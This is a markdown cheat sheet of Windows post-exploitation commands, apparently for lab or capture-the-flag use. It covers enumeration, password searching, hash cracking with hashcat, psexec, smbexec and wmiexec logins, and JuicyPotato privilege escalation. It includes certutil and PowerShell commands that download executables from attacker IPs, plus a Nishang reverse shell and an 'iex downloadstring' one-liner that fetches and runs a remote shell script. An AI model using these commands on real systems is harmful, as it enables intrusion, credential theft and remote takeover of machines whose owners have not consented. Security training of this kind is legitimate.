
## System enumeration

### enumerate from meterpreter shell
```
sysinfo
```

### get shell
```
shell
```

### get system info from shell
```
systeminfo
```
this shows us installed date, boot time, hot fixes installed or not.

## User enumeration 

### Find out loggedin user and his privilages
```
whoami
whoami /priv
```

### Find all users on the host
```
net users
```

### Find details of specific user
```
net user janith
```

### Find whos on administrator group
```
net localgroup administrators
```

## Network enumeration

###Find host ip
```
ipconfig
ipconfig /all
```

## Searching for passwords

### Search for passwords
```
findstr /si password *.txt
```

## AV and Firewall enumeration

### Find all the services running
```
sc queryex type= service 
```

### Check firewall info
```
netsh advfirewall firewall dump
netsh firewall show state
```

### metersploit local exploit sugester
```
run post/multi/recon/local_exploit_suggester
```
run this script using the session 

### Run windows exploit suggester using systeminfo
```
python windows-exploit-suggester.py --database 2020-10-12-mssb.xls --systeminfo sysinfo.txt
```

## Downloading files into windows host
first go to c:/temp folder
```
certutil -urlcache -f http://10.10.14.32/temp.exe temp.exe
```

## Download files using powershell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.1/shell.exe', 'c:\Users\Public\Downloads\shell.exe')"
```

## Windows subsystem for linux

### Search for bash or wsl
```
where /R C:\windows bash.exe
where /R C:\windows wsl.exe
```
If you found connect to linux sub folder and search for history.

## Use credentials to login using psexec.py
```
psexec.py USER:PASSWORD@DOMAIN
smbexec.py USER:PASS@DOMAIN
wmiexec USER:PASS@DOAMIN
```

## connect to SMB using credentials
```
smbclient \\\\IP\\FOLDER -U USER
```

## SAM file path
```
C:\Windows\System32\Config
```

## Crack windows hash using hashcat
```
hashcat -a 0 -m 1000 cred.hash rockyou.txt --force
```

## Imporsanate privilage escalate

### Search for privilages
```
whoami /priv
```

### Use this command to search meterpreter session
```
getprivs
```

## These privilages are vulnerable to juicypotato attacks
```
SeImporsanatePrivilage Enable
SeAssignPrimaryToken Enable 
```

## Use nishang script to gain reverse shell
```
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1234
powershell -c iex(new-object net.webclient).downloadstring(‘http://10.10.14.45:5555/shell.ps1')
```

